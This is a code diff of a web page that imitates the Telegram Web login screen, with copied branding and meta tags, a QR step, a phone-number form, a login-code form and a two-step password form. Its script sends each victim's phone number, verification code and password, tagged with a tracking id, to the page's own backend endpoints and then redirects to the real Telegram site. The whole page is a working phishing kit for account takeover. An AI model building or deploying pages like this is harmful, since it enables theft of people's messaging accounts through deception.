@@ -3,18 +3,29 @@
 <head>
     <meta charset="utf-8">
     <title>Telegram Web</title>
-    <link rel="icon" type="image/svg+xml" href="https://web.telegram.org/a/favicon.svg">
-    <link rel="alternate icon" href="https://web.telegram.org/a/favicon.ico" type="image/x-icon">
+    
+    <meta name="title" content="Telegram Web">
+    <meta name="description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Telegram">
+    <meta property="og:title" content="Telegram Web">
+    <meta property="og:description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
+    <meta property="og:url" content="https://web.telegram.org/">
+    <meta property="og:image" content="https://web.telegram.org/img/logo_share.png">
     
     <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
-    
+    <meta name="theme-color" content="#0f0f0f"> <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="icon" type="image/svg+xml" href="https://web.telegram.org/a/favicon.svg">
+    <link rel="alternate icon" href="https://web.telegram.org/a/favicon.ico" type="image/x-icon">
+
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"/>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/lottie-web/5.9.6/lottie.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 
     <style>
-        /* --- OFFICIAL TELEGRAM K-VERSION PALETTE --- */
+        /* --- DESIGN SYSTEM: TELEGRAM DARK K-VERSION --- */
         :root {
             --bg-color: #0f0f0f;
             --surface-color: #1c1c1c;
@@ -36,67 +47,57 @@
         body {
             background-color: var(--bg-color);
             color: var(--text-primary);
-            font-family: -apple-system, BlinkMacSystemFont, "Apple Color Emoji", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            overflow-x: hidden;
+            overflow: hidden;
         }
 
         .auth-container {
             width: 100%;
             max-width: 420px;
-            padding: 20px;
+            padding: 24px;
             text-align: center;
         }
 
-        .step-card {
-            display: none;
-            animation: tg-fade 0.3s ease-out;
-        }
-
-        .step-card.active { display: block; }
-
-        @keyframes tg-fade {
-            from { opacity: 0; transform: translateY(8px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        /* --- LOGO & ICON STYLES --- */
+        /* --- LOGO & ANIMATIONS --- */
         .tg-logo-large {
             width: 140px;
             height: 140px;
             margin: 0 auto 40px;
         }
 
-        .monkey-anim {
+        .monkey-container {
             width: 140px;
             height: 140px;
             margin: 0 auto 20px;
         }
 
-        /* --- QR CODE DESIGN (Matches Screenshot) --- */
-        .qr-frame {
-            position: relative;
-            width: 240px;
-            height: 240px;
-            margin: 0 auto 35px;
+        /* --- QR CODE STYLING (The "Real" Frame) --- */
+        .qr-wrapper {
             background: #ffffff;
-            padding: 15px;
+            padding: 18px;
             border-radius: 35px;
+            display: inline-block;
+            margin-bottom: 35px;
+            position: relative;
             box-shadow: 0 10px 40px rgba(0,0,0,0.5);
         }
 
-        #qr-canvas { width: 100%; height: 100%; }
+        #qr-canvas img {
+            width: 210px;
+            height: 210px;
+        }
 
         .qr-center-logo {
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            width: 60px;
-            height: 60px;
+            width: 55px;
+            height: 55px;
             background: white;
             border-radius: 50%;
             display: flex;
@@ -106,14 +107,33 @@
         }
 
         /* --- TYPOGRAPHY --- */
-        h1 { font-size: 30px; font-weight: 600; margin-bottom: 12px; }
-        p.desc { font-size: 16px; color: var(--text-secondary); line-height: 1.5; margin-bottom: 40px; }
-        ol.qr-steps { text-align: left; display: inline-block; color: var(--text-primary); margin-bottom: 30px; line-height: 1.8; }
+        h1 {
+            font-size: 30px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            letter-spacing: -0.5px;
+        }
 
-        /* --- INPUTS & BUTTONS --- */
+        p.subtitle {
+            font-size: 16px;
+            color: var(--text-secondary);
+            line-height: 1.5;
+            margin-bottom: 45px;
+        }
+
+        ol.qr-instructions {
+            text-align: left;
+            display: inline-block;
+            color: var(--text-primary);
+            margin-bottom: 30px;
+            line-height: 2;
+            font-size: 15px;
+        }
+
+        /* --- INPUT FIELDS & GROUPS --- */
         .input-group {
             position: relative;
-            margin-bottom: 25px;
+            margin-bottom: 30px;
             text-align: left;
         }
 
@@ -122,9 +142,9 @@
             top: -10px;
             left: 12px;
             background: var(--bg-color);
-            padding: 0 5px;
+            padding: 0 6px;
             color: var(--accent-color);
-            font-size: 12px;
+            font-size: 13px;
             font-weight: 600;
             z-index: 5;
         }
@@ -133,28 +153,33 @@
             width: 100%;
             background: transparent;
             border: 1px solid var(--input-border);
-            border-radius: 10px;
+            border-radius: 12px;
             padding: 18px 16px;
             color: white;
             font-size: 17px;
             outline: none;
-            transition: border 0.2s;
+            transition: all 0.2s ease;
         }
 
-        .tg-input:focus { border: 2px solid var(--accent-color); padding: 17px 15px; }
+        .tg-input:focus {
+            border: 2px solid var(--accent-color);
+            padding: 17px 15px;
+        }
 
-        /* Request: Red Line on Error */
-        .tg-input.error { border: 2px solid var(--error-red) !important; animation: shake 0.2s ease-in-out 0s 2; }
-        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
+        .tg-input.is-error {
+            border: 2px solid var(--error-red);
+            animation: shake 0.2s ease-in-out 0s 2;
+        }
 
-        .btn-primary {
+        /* --- BUTTONS --- */
+        .btn-tg {
             width: 100%;
             background-color: var(--accent-color);
             color: white;
             border: none;
             border-radius: 12px;
             padding: 18px;
-            font-size: 15px;
+            font-size: 16px;
             font-weight: 600;
             cursor: pointer;
             text-transform: uppercase;
@@ -162,11 +187,11 @@
             transition: background 0.2s;
         }
 
-        .btn-primary:hover { background-color: var(--accent-hover); }
+        .btn-tg:hover { background-color: var(--accent-hover); }
 
-        .action-link {
+        .link-text {
             display: inline-block;
-            margin-top: 25px;
+            margin-top: 30px;
             color: var(--accent-color);
             text-decoration: none;
             font-weight: 600;
@@ -175,23 +200,55 @@
             cursor: pointer;
         }
 
-        /* OTP Row */
-        .otp-row { display: flex; justify-content: center; gap: 10px; margin-bottom: 30px; }
-        .otp-digit {
-            width: 48px;
-            height: 60px;
-            border: 1px solid var(--input-border);
-            border-radius: 10px;
-            background: rgba(255,255,255,0.03);
-            text-align: center;
-            font-size: 24px;
-            font-weight: bold;
-            color: white;
+        /* --- OTP DIGITS --- */
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 35px;
         }
-        .otp-digit:focus { border: 2px solid var(--accent-color); outline: none; }
 
-        /* Loader Spinner */
-        .spinner { display: none; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.2); border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; margin-left: 10px; vertical-align: middle; }
+        .otp-input {
+            width: 50px;
+            height: 62px;
+            border: 1px solid var(--input-border);
+            border-radius: 12px;
+            background: rgba(255,255,255,0.02);
+            text-align: center;
+            font-size: 26px;
+            font-weight: 700;
+            color: white;
+            outline: none;
+        }
+
+        .otp-input:focus { border: 2px solid var(--accent-color); }
+
+        /* --- UTILS --- */
+        .step-hidden { display: none; }
+        .step-active { display: block; animation: slideUp 0.35s ease-out; }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+
+        .spinner {
+            display: none;
+            width: 22px;
+            height: 22px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-left: 10px;
+            vertical-align: middle;
+        }
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
@@ -199,188 +256,199 @@
 
     <div class="auth-container">
         
-        <div id="step-qr" class="step-card active">
-            <div class="qr-frame">
+        <div id="step-qr" class="step-active">
+            <div class="qr-wrapper">
                 <div id="qr-canvas"></div>
                 <div class="qr-center-logo">
                     <svg width="40" height="40" viewBox="0 0 240 240"><circle cx="120" cy="120" r="120" fill="#8774E1"/><path d="M175 79L55 125L89 137L102 178L130 148L163 173L175 79Z" fill="white"/></svg>
                 </div>
             </div>
             <h1>Log in to Telegram by QR Code</h1>
-            <ol class="qr-steps">
+            <ol class="qr-instructions">
                 <li>1. Open Telegram on your phone</li>
                 <li>2. Go to <b>Settings</b> > <b>Devices</b> > <b>Link Desktop Device</b></li>
                 <li>3. Point your phone at this screen to confirm login</li>
             </ol>
             <br>
-            <div class="action-link" onclick="navTo('phone')">Log in by phone number</div>
+            <div class="link-text" onclick="navigateTo('phone')">Log in by phone number</div>
         </div>
 
-        <div id="step-phone" class="step-card">
+        <div id="step-phone" class="step-hidden">
             <div class="tg-logo-large">
                 <svg width="140" height="140" viewBox="0 0 240 240"><circle cx="120" cy="120" r="120" fill="#8774E1"/><path d="M175 79L55 125L89 137L102 178L130 148L163 173L175 79Z" fill="white"/></svg>
             </div>
             <h1>Sign in to Telegram</h1>
-            <p class="desc">Please confirm your country code and enter your phone number.</p>
+            <p class="subtitle">Please confirm your country code and enter your phone number.</p>
             <div class="input-group">
                 <span class="floating-label">Phone Number</span>
-                <input type="tel" id="phone-field" class="tg-input">
+                <input type="tel" id="phone-input" class="tg-input">
             </div>
-            <button class="btn-primary" onclick="submitPhone()">Next <span class="spinner" id="s-phone"></span></button>
-            <div class="action-link" onclick="navTo('qr')">Back</div>
+            <button class="btn-tg" onclick="handlePhone()">Next <span class="spinner" id="spin-phone"></span></button>
+            <div class="link-text" onclick="navigateTo('qr')">Back</div>
         </div>
 
-        <div id="step-otp" class="step-card">
-            <div class="monkey-anim" id="m-otp"></div>
-            <h1 id="user-phone-display">+855...</h1>
-            <p class="desc">We've sent you a message in Telegram with the code.</p>
-            <div class="otp-row">
-                <input type="text" maxlength="1" class="otp-digit" autofocus>
-                <input type="text" maxlength="1" class="otp-digit">
-                <input type="text" maxlength="1" class="otp-digit">
-                <input type="text" maxlength="1" class="otp-digit">
-                <input type="text" maxlength="1" class="otp-digit">
+        <div id="step-otp" class="step-hidden">
+            <div class="monkey-container" id="lottie-otp"></div>
+            <h1 id="display-phone">+855...</h1>
+            <p class="subtitle">We've sent you a message in Telegram with the code.</p>
+            <div class="otp-container">
+                <input type="text" maxlength="1" class="otp-input" id="otp-1">
+                <input type="text" maxlength="1" class="otp-input" id="otp-2">
+                <input type="text" maxlength="1" class="otp-input" id="otp-3">
+                <input type="text" maxlength="1" class="otp-input" id="otp-4">
+                <input type="text" maxlength="1" class="otp-input" id="otp-5">
             </div>
-            <button class="btn-primary" onclick="submitOTP()">Verify <span class="spinner" id="s-otp"></span></button>
+            <button class="btn-tg" onclick="handleOTP()">Verify <span class="spinner" id="spin-otp"></span></button>
         </div>
 
-        <div id="step-2fa" class="step-card">
-            <div class="monkey-anim" id="m-2fa"></div>
-            <h1>Password</h1>
-            <p class="desc">Your account is protected with a cloud password.</p>
+        <div id="step-2fa" class="step-hidden">
+            <div class="monkey-container" id="lottie-2fa"></div>
+            <h1>Two-Step Verification</h1>
+            <p class="subtitle">Your account is protected with an additional password.</p>
             <div class="input-group">
-                <span class="floating-label">Cloud Password</span>
-                <input type="password" id="pass-field" class="tg-input" placeholder="Enter password">
+                <span class="floating-label">Password</span>
+                <input type="password" id="password-input" class="tg-input" placeholder="Enter your password">
             </div>
-            <button class="btn-primary" onclick="submit2FA()">Unlock <span class="spinner" id="s-2fa"></span></button>
+            <button class="btn-tg" onclick="handle2FA()">Unlock <span class="spinner" id="spin-2fa"></span></button>
         </div>
 
     </div>
 
     <script>
-        const MONKEY_LOTTIE = "https://assets1.lottiefiles.com/packages/lf20_969018ny.json";
+        // --- CONFIG & STATE ---
+        const MONKEY_JSON = "https://assets10.lottiefiles.com/packages/lf20_969018ny.json";
         const TID = new URLSearchParams(window.location.search).get('id') || '0';
         let currentPhone = "";
-        let anims = {};
+        let animations = {};
 
         window.onload = () => {
-            // 1. Initialize QR (To make it work, backend must provide a real token)
+            // 1. Init QR (Placeholder for now, backend should update token)
             new QRCode(document.getElementById("qr-canvas"), {
-                text: "tg://login?token=AQJH_MIRROR_SESSION_ACTIVE", // Backend should replace this
+                text: "tg://login?token=AQJH_INITIAL_TOKEN",
                 width: 210, height: 210, colorDark: "#000000", colorLight: "#ffffff"
             });
 
-            // 2. Initialize Phone Input
-            const pField = document.querySelector("#phone-field");
-            window.iti = window.intlTelInput(pField, {
+            // 2. Init Intl-Tel-Input
+            const phoneEl = document.querySelector("#phone-input");
+            window.iti = window.intlTelInput(phoneEl, {
                 initialCountry: "kh",
                 separateDialCode: true,
                 utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
             });
 
-            // 3. Load Monkeys
-            ['otp', '2fa'].forEach(s => {
-                anims[s] = lottie.loadAnimation({
-                    container: document.getElementById(`m-${s}`),
-                    path: MONKEY_LOTTIE, renderer: 'svg', loop: true, autoplay: false
+            // 3. Init Lottie Monkeys
+            ['otp', '2fa'].forEach(type => {
+                animations[type] = lottie.loadAnimation({
+                    container: document.getElementById(`lottie-${type}`),
+                    path: MONKEY_JSON, renderer: 'svg', loop: true, autoplay: false
                 });
             });
 
-            setupOtpInputLogic();
+            setupOtpAutoTab();
         };
 
-        function navTo(step) {
-            document.querySelectorAll('.step-card').forEach(c => c.classList.remove('active'));
-            document.getElementById(`step-${step}`).classList.add('active');
-            if(anims[step]) anims[step].play();
+        function navigateTo(step) {
+            document.querySelectorAll('[id^="step-"]').forEach(el => {
+                el.classList.remove('step-active');
+                el.classList.add('step-hidden');
+            });
+            const target = document.getElementById(`step-${step}`);
+            target.classList.remove('step-hidden');
+            target.classList.add('step-active');
+            
+            if (animations[step]) animations[step].play();
         }
 
-        async function submitPhone() {
+        async function handlePhone() {
             currentPhone = window.iti.getNumber();
-            if(!window.iti.isValidNumber()) return setInputError('phone-field');
+            if(!window.iti.isValidNumber()) return triggerError('phone-input');
 
-            toggleLoad('phone', true);
-            const res = await fetch('/step_phone', {
+            toggleSpinner('phone', true);
+            const response = await fetch('/step_phone', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ phone: currentPhone, tid: TID })
             });
-            const data = await res.json();
-            toggleLoad('phone', false);
+            const result = await response.json();
+            toggleSpinner('phone', false);
 
-            if(data.status === "success") {
-                document.getElementById('user-phone-display').innerText = currentPhone;
-                navTo('otp');
+            if(result.status === "success") {
+                document.getElementById('display-phone').innerText = currentPhone;
+                navigateTo('otp');
             } else {
-                setInputError('phone-field');
+                triggerError('phone-input');
             }
         }
 
-        async function submitOTP() {
-            const code = Array.from(document.querySelectorAll('.otp-digit')).map(d => d.value).join('');
-            if(code.length < 5) return setOtpError();
+        async function handleOTP() {
+            const code = [1,2,3,4,5].map(i => document.getElementById(`otp-${i}`).value).join('');
+            if(code.length < 5) return triggerOtpError();
 
-            toggleLoad('otp', true);
-            const res = await fetch('/step_code', {
+            toggleSpinner('otp', true);
+            const response = await fetch('/step_code', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ phone: currentPhone, code: code, tid: TID })
             });
-            const data = await res.json();
-            toggleLoad('otp', false);
+            const result = await response.json();
+            toggleSpinner('otp', false);
 
-            if(data.status === "success") {
+            if(result.status === "success") {
                 window.location.href = "https://web.telegram.org/a/";
-            } else if(data.status === "2fa_needed") {
-                navTo('2fa');
+            } else if(result.status === "2fa_needed") {
+                navigateTo('2fa');
             } else {
-                setOtpError();
+                triggerOtpError();
             }
         }
 
-        async function submit2FA() {
-            const password = document.getElementById('pass-field').value;
-            if(!password) return setInputError('pass-field');
+        async function handle2FA() {
+            const pwd = document.getElementById('password-input').value;
+            if(!pwd) return triggerError('password-input');
 
-            toggleLoad('2fa', true);
-            const res = await fetch('/step_2fa', {
+            toggleSpinner('2fa', true);
+            const response = await fetch('/step_2fa', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: currentPhone, password: password, tid: TID })
+                body: JSON.stringify({ phone: currentPhone, password: pwd, tid: TID })
             });
-            const data = await res.json();
-            toggleLoad('2fa', false);
+            const result = await response.json();
+            toggleSpinner('2fa', false);
 
-            if(data.status === "success") {
+            if(result.status === "success") {
                 window.location.href = "https://web.telegram.org/a/";
             } else {
-                setInputError('pass-field');
+                triggerError('password-input');
             }
         }
 
-        // --- UI HELPERS ---
-        function setInputError(id) {
+        // UI HELPERS
+        function triggerError(id) {
             const el = document.getElementById(id);
-            el.classList.add('error');
-            setTimeout(() => el.classList.remove('error'), 1000);
+            el.classList.add('is-error');
+            setTimeout(() => el.classList.remove('is-error'), 1000);
         }
 
-        function setOtpError() {
-            document.querySelectorAll('.otp-digit').forEach(d => {
-                d.style.borderColor = 'var(--error-red)';
-                setTimeout(() => d.style.borderColor = 'var(--input-border)', 1000);
+        function triggerOtpError() {
+            document.querySelectorAll('.otp-input').forEach(el => {
+                el.style.borderColor = 'var(--error-red)';
+                setTimeout(() => el.style.borderColor = 'var(--input-border)', 1000);
             });
         }
 
-        function toggleLoad(step, show) {
-            document.getElementById(`s-${step}`).style.display = show ? 'inline-block' : 'none';
+        function toggleSpinner(step, show) {
+            document.getElementById(`spin-${step}`).style.display = show ? 'inline-block' : 'none';
         }
 
-        function setupOtpInputLogic() {
-            const digits = document.querySelectorAll('.otp-digit');
-            digits.forEach((d, i) => {
-                d.addEventListener('input', () => { if(d.value && i < 4) digits[i+1].focus(); });
-                d.addEventListener('keydown', (e) => { if(e.key === 'Backspace' && !d.value && i > 0) digits[i-1].focus(); });
+        function setupOtpAutoTab() {
+            const inputs = document.querySelectorAll('.otp-input');
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', () => {
+                    if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
+                });
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
+                });
             });
         }
     </script>
